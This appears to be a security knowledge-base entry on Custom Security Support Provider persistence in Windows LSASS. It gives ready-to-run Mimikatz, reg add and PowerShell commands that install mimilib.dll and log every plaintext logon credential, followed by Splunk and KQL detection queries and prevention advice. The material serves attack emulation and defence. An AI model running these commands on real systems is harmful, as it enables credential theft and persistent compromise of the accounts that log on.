name: Custom SSP - Security Support Provider Persistence
description: A Custom Security Support Provider (SSP) hooks into LSASS to capture plaintext credentials at every logon. mimilib.dll (shipped with Mimikatz) is the classic SSP that logs all credentials to C:\Windows\System32\kiwissp.log. Can be installed via registry (survives reboot) or in-memory (fileless, lost on reboot).
notes:
=== THE IDEA ===
SSPs are DLLs that plug into LSASS and handle authentication.
By registering a custom SSP (like mimilib.dll), you capture
all plaintext credentials at logon time.

=== METHOD 1: In-Memory (fileless, lost on reboot) ===
  mimikatz # privilege::debug
  mimikatz # misc::memssp
  # All future logons logged to C:\Windows\System32\mimilsa.log
  # No DLL on disk, no registry change

=== METHOD 2: Registry Persistence (survives reboot) ===
  # Copy mimilib.dll to System32
  copy mimilib.dll C:\Windows\System32\

  # Add to SSP list in registry
  reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

  # After reboot: credentials logged to C:\Windows\System32\kiwissp.log

=== METHOD 3: PowerShell (AddSecurityPackage API) ===
  # Requires mimilib.dll in System32
  $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "Security Packages"
  $packages."Security Packages" += "mimilib"
  Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "Security Packages" -Value $packages."Security Packages"

=== READ CAPTURED CREDS ===
  type C:\Windows\System32\kiwissp.log
  type C:\Windows\System32\mimilsa.log

=== CLEANUP ===
  # Remove from registry
  # Delete mimilib.dll from System32
  # Restart to unload from memory

examples.label: Registry-based persistence
examples.command: copy mimilib.dll C:\Windows\System32\ && reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

defense.why_it_works: LSASS loads all registered SSPs and calls their SpAcceptCredentials function on each logon, passing plaintext credentials. A malicious SSP simply logs these to a file.
defense.prerequisites: Local administrator or SYSTEM access on the target (to modify LSASS or registry).
defense.impact: All future logon credentials captured in plaintext - including domain admin and service accounts.
defense.detection: [MITRE T1547.005] Changes to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages; unknown DLLs loaded into lsass.exe; mimilib.dll or kiwissp.log on disk.
defense.artifacts: Registry modification (Event 4657); DLL loaded into LSASS (Sysmon Event 7); kiwissp.log or mimilsa.log file creation.
defense.splunk_spl:
index=sysmon EventCode=7 Image="*lsass.exe"
| where NOT match(ImageLoaded, "(msv1_0|kerberos|schannel|wdigest|tspkg|pku2u|cloudAP)\.dll$")
| table _time, Image, ImageLoaded, Hashes
defense.elastic_kql: event.code:"7" AND process.name:"lsass.exe" AND NOT dll.name:(msv1_0.dll OR kerberos.dll OR schannel.dll OR wdigest.dll)
defense.sentinel_kql:
SysmonEvent
| where EventID == 7 and Image endswith "lsass.exe"
| where ImageLoaded !contains "msv1_0" and ImageLoaded !contains "kerberos" and ImageLoaded !contains "schannel"
| project TimeGenerated, Image, ImageLoaded, Hashes
defense.prevention: Monitor LSASS module loads (Sysmon Event 7); protect LSASS with Credential Guard; monitor LSA Security Packages registry key; restrict write access to System32.

detections.name: Custom SSP - Unknown DLL loaded into LSASS
detections.logic:
SysmonEvent
| where EventID == 7 and Image endswith "lsass.exe"
| where ImageLoaded !has_any ("msv1_0","kerberos","schannel","wdigest","tspkg","pku2u","cloudAP","livessp","negoexts")
| project TimeGenerated, Image, ImageLoaded, Hashes, SignatureStatus
detections.tuning: Whitelist known legitimate SSP DLLs; alert on unsigned DLLs
